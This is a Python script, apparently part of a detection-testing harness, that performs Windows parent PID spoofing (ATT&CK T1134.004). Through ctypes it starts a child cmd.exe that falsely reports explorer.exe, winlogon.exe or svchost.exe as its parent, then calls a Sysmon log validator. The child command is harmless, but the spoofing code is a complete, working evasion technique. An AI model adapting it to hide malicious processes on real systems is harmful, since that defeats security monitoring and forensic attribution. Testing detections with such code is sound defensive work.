#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T1134.004 — Parent PID Spoofing
MITRE ATT&CK: https://attack.mitre.org/techniques/T1134/004/

利用 STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 偽造子 process 的父 PID，
使 Sysmon Event 1 顯示假父而非真正的呼叫者。

預期觸發：
  Event 10 — OpenProcess(PROCESS_CREATE_PROCESS) 對假父，GrantedAccess 0x80
  Event 1  — 子 process 建立，ParentImage 顯示偽造的父 process
"""

import ctypes
import ctypes.wintypes
import datetime
import json
import os
import subprocess
import sys
import time
from pathlib import Path

# ── 常數 ──────────────────────────────────────────────────────────────────────

PROCESS_CREATE_PROCESS           = 0x0080        # OpenProcess 只需要這個 right
EXTENDED_STARTUPINFO_PRESENT     = 0x00080000    # CreateProcess 旗標：使用 STARTUPINFOEX
CREATE_NO_WINDOW                 = 0x08000000    # 不開新主控台視窗
# ProcThreadAttributeValue(0, FALSE, TRUE, FALSE) = 0x00020000
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
TH32CS_SNAPPROCESS               = 0x00000002    # 枚舉所有 process

# ── ctypes 型別別名 ────────────────────────────────────────────────────────────

DWORD  = ctypes.wintypes.DWORD
WORD   = ctypes.wintypes.WORD
HANDLE = ctypes.wintypes.HANDLE
BOOL   = ctypes.wintypes.BOOL
LPWSTR = ctypes.wintypes.LPWSTR
LPVOID = ctypes.c_void_p
SIZE_T = ctypes.c_size_t
LPBYTE = ctypes.POINTER(ctypes.c_ubyte)

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# ── 結構定義 ──────────────────────────────────────────────────────────────────


class PROCESSENTRY32W(ctypes.Structure):
    """Toolhelp32 Snapshot 枚舉 process 用的結構"""
    _fields_ = [
        ("dwSize",              DWORD),
        ("cntUsage",            DWORD),
        ("th32ProcessID",       DWORD),
        ("th32DefaultHeapID",   SIZE_T),        # ULONG_PTR（pointer-sized）
        ("th32ModuleID",        DWORD),
        ("cntThreads",          DWORD),
        ("th32ParentProcessID", DWORD),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             DWORD),
        ("szExeFile",           ctypes.c_wchar * 260),
    ]


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              DWORD),
        ("lpReserved",      LPWSTR),
        ("lpDesktop",       LPWSTR),
        ("lpTitle",         LPWSTR),
        ("dwX",             DWORD),
        ("dwY",             DWORD),
        ("dwXSize",         DWORD),
        ("dwYSize",         DWORD),
        ("dwXCountChars",   DWORD),
        ("dwYCountChars",   DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags",         DWORD),
        ("wShowWindow",     WORD),
        ("cbReserved2",     WORD),
        ("lpReserved2",     LPBYTE),
        ("hStdInput",       HANDLE),
        ("hStdOutput",      HANDLE),
        ("hStdError",       HANDLE),
    ]


class STARTUPINFOEXW(ctypes.Structure):
    """STARTUPINFO 的擴充版本，cb 必須填 sizeof(STARTUPINFOEXW)"""
    _fields_ = [
        ("StartupInfo",     STARTUPINFOW),
        ("lpAttributeList", LPVOID),            # LPPROC_THREAD_ATTRIBUTE_LIST
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    HANDLE),
        ("hThread",     HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId",  DWORD),
    ]


# ── API 原型宣告 ───────────────────────────────────────────────────────────────

kernel32.CreateToolhelp32Snapshot.restype  = HANDLE
kernel32.CreateToolhelp32Snapshot.argtypes = [DWORD, DWORD]

kernel32.Process32FirstW.restype  = BOOL
kernel32.Process32FirstW.argtypes = [HANDLE, ctypes.POINTER(PROCESSENTRY32W)]

kernel32.Process32NextW.restype  = BOOL
kernel32.Process32NextW.argtypes = [HANDLE, ctypes.POINTER(PROCESSENTRY32W)]

kernel32.OpenProcess.restype  = HANDLE
kernel32.OpenProcess.argtypes = [DWORD, BOOL, DWORD]

kernel32.InitializeProcThreadAttributeList.restype  = BOOL
kernel32.InitializeProcThreadAttributeList.argtypes = [
    LPVOID,                  # lpAttributeList（第一次傳 NULL 取大小）
    DWORD,                   # dwAttributeCount
    DWORD,                   # dwFlags（保留，必須為 0）
    ctypes.POINTER(SIZE_T),  # lpSize（in/out）
]

kernel32.UpdateProcThreadAttribute.restype  = BOOL
kernel32.UpdateProcThreadAttribute.argtypes = [
    LPVOID,                  # lpAttributeList
    DWORD,                   # dwFlags（保留，必須為 0）
    SIZE_T,                  # Attribute（DWORD_PTR）
    LPVOID,                  # lpValue
    SIZE_T,                  # cbSize
    LPVOID,                  # lpPreviousValue（保留，傳 NULL）
    ctypes.POINTER(SIZE_T),  # lpReturnSize（保留，傳 NULL）
]

kernel32.CreateProcessW.restype  = BOOL
kernel32.CreateProcessW.argtypes = [
    LPWSTR,                              # lpApplicationName
    LPWSTR,                              # lpCommandLine
    LPVOID,                              # lpProcessAttributes
    LPVOID,                              # lpThreadAttributes
    BOOL,                                # bInheritHandles
    DWORD,                               # dwCreationFlags
    LPVOID,                              # lpEnvironment
    LPWSTR,                              # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOEXW),      # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION), # lpProcessInformation
]

kernel32.DeleteProcThreadAttributeList.restype  = None
kernel32.DeleteProcThreadAttributeList.argtypes = [LPVOID]

kernel32.CloseHandle.restype  = BOOL
kernel32.CloseHandle.argtypes = [HANDLE]

# ── 輔助函式 ──────────────────────────────────────────────────────────────────

# CreateToolhelp32Snapshot 失敗時回傳的特殊值
_INVALID_HANDLE = ctypes.c_size_t(-1).value


def is_admin() -> bool:
    """確認目前 process 是否以 Administrator 身份執行"""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def find_pid_by_name(process_name: str) -> int | None:
    """
    用 CreateToolhelp32Snapshot 枚舉所有執行中的 process，
    回傳第一個符合 process_name 的 PID；找不到則回傳 None。
    """
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == _INVALID_HANDLE:
        return None

    entry = PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    try:
        if not kernel32.Process32FirstW(snap, ctypes.byref(entry)):
            return None
        while True:
            if entry.szExeFile.lower() == process_name.lower():
                return int(entry.th32ProcessID)
            if not kernel32.Process32NextW(snap, ctypes.byref(entry)):
                break
    finally:
        kernel32.CloseHandle(snap)
    return None


# ── 核心手法 ──────────────────────────────────────────────────────────────────

def spoof_parent_and_spawn(spoofed_parent_pid: int, child_cmdline: str) -> dict:
    """
    以 spoofed_parent_pid 指定的 process 作為假父，建立執行 child_cmdline 的子 process。

    觸發的 Sysmon 事件：
      Event 10：本函式呼叫 OpenProcess(0x80) 存取假父 → GrantedAccess 0x80
      Event 1 ：子 process 建立 → ParentProcessId / ParentImage 顯示假父
    """
    # 步驟 1：以最小權限 PROCESS_CREATE_PROCESS 開啟假父 handle
    # （觸發 Sysmon Event 10，GrantedAccess = 0x80）
    h_parent = kernel32.OpenProcess(PROCESS_CREATE_PROCESS, False, spoofed_parent_pid)
    if not h_parent:
        raise ctypes.WinError(ctypes.get_last_error())

    try:
        # 步驟 2：第一次呼叫 InitializeProcThreadAttributeList，傳 NULL 取得緩衝區大小
        # 預期回傳 FALSE + ERROR_INSUFFICIENT_BUFFER，但 lpSize 會被填入正確大小
        attr_size = SIZE_T(0)
        kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(attr_size))

        # 步驟 3：配置緩衝區，第二次呼叫完成初始化
        attr_buf     = (ctypes.c_byte * attr_size.value)()
        attr_list    = ctypes.cast(attr_buf, LPVOID)
        if not kernel32.InitializeProcThreadAttributeList(
            attr_list, 1, 0, ctypes.byref(attr_size)
        ):
            raise ctypes.WinError(ctypes.get_last_error())

        try:
            # 步驟 4：將假父 handle 寫入 attribute list
            # lpValue 必須是 *指向 HANDLE 的指標*，cbSize = sizeof(HANDLE)
            h_val = HANDLE(h_parent)
            if not kernel32.UpdateProcThreadAttribute(
                attr_list,
                0,
                SIZE_T(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                ctypes.cast(ctypes.byref(h_val), LPVOID),
                ctypes.sizeof(HANDLE),
                None,
                None,
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            # 步驟 5：組裝 STARTUPINFOEXW，cb 填 sizeof(STARTUPINFOEXW) 而非 STARTUPINFOW
            si_ex = STARTUPINFOEXW()
            si_ex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
            si_ex.lpAttributeList = attr_list

            pi = PROCESS_INFORMATION()

            # 步驟 6：CreateProcess 帶 EXTENDED_STARTUPINFO_PRESENT
            # （觸發 Sysmon Event 1，ParentProcessId 顯示 spoofed_parent_pid）
            creation_flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW
            cmd_buf = ctypes.create_unicode_buffer(child_cmdline)

            if not kernel32.CreateProcessW(
                None,
                cmd_buf,
                None,
                None,
                False,
                creation_flags,
                None,
                None,
                ctypes.byref(si_ex),
                ctypes.byref(pi),
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            child_pid = int(pi.dwProcessId)
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)

        finally:
            # 步驟 7：清理 attribute list（無論成功失敗都必須執行）
            kernel32.DeleteProcThreadAttributeList(attr_list)

    finally:
        kernel32.CloseHandle(h_parent)

    return {
        "child_pid":           child_pid,
        "spoofed_parent_pid":  spoofed_parent_pid,
        "child_cmdline":       child_cmdline,
    }


# ── 主程式 ────────────────────────────────────────────────────────────────────

def main() -> None:
    # 權限確認
    if not is_admin():
        print("[-] 需要 Administrator 權限，請以系統管理員身份重新執行。", file=sys.stderr)
        sys.exit(1)

    # 尋找可偽裝的父 process（依序嘗試，取第一個找到的）
    candidates = ["explorer.exe", "winlogon.exe", "svchost.exe"]
    spoofed_pid  = None
    spoofed_name = None
    for name in candidates:
        pid = find_pid_by_name(name)
        if pid:
            spoofed_pid  = pid
            spoofed_name = name
            break

    if not spoofed_pid:
        print("[-] 找不到可偽裝的父 process（explorer / winlogon / svchost）。", file=sys.stderr)
        sys.exit(1)

    print(f"[*] 偽裝父 process：{spoofed_name} (PID {spoofed_pid})")

    # 子 process 指令（無害；關鍵字 T1134004_PID_SPOOF_TEST 會出現在 Sysmon Event 1 CommandLine）
    child_cmd = "cmd.exe /c echo T1134004_PID_SPOOF_TEST"

    # 記錄執行時間戳（validator 的時間視窗起點）
    exec_ts = datetime.datetime.utcnow().isoformat() + "Z"

    result = spoof_parent_and_spawn(spoofed_pid, child_cmd)

    print(f"[+] 子 process 已建立，PID: {result['child_pid']}")
    print(f"[+] Sysmon Event 1  → ParentImage 應顯示 {spoofed_name} (PID {spoofed_pid})")
    print(f"[+] Sysmon Event 10 → 本 process 對 {spoofed_name} 的 GrantedAccess 0x80")

    output = {
        "technique_id":  "T1134.004",
        "executed":      True,
        "timestamp":     exec_ts,
        "technique_pid": os.getpid(),
        "details":       result,
    }
    print(json.dumps(output, indent=2, ensure_ascii=False))

    # 等待 Sysmon 將事件非同步寫入 log（通常 1-3 秒，保守取 5 秒）
    print("[*] 等待 Sysmon 寫入事件（5 秒）...", file=sys.stderr)
    time.sleep(5)

    # 自動呼叫 validator（向上找包含 techniques/ 的根目錄）
    root = Path(__file__).resolve().parent
    for _ in range(6):
        if (root / "techniques").is_dir():
            break
        root = root.parent
    validator = root / "validator" / "check_logs.py"
    if not validator.exists():
        print(f"[-] 找不到 validator：{validator}", file=sys.stderr)
        return

    subprocess.run(
        [
            sys.executable, str(validator),
            "--technique",     "T1134.004",
            "--child-pid",     str(result["child_pid"]),
            "--technique-pid", str(os.getpid()),
            "--timestamp",     exec_ts,
        ],
        check=False,
    )


if __name__ == "__main__":
    main()
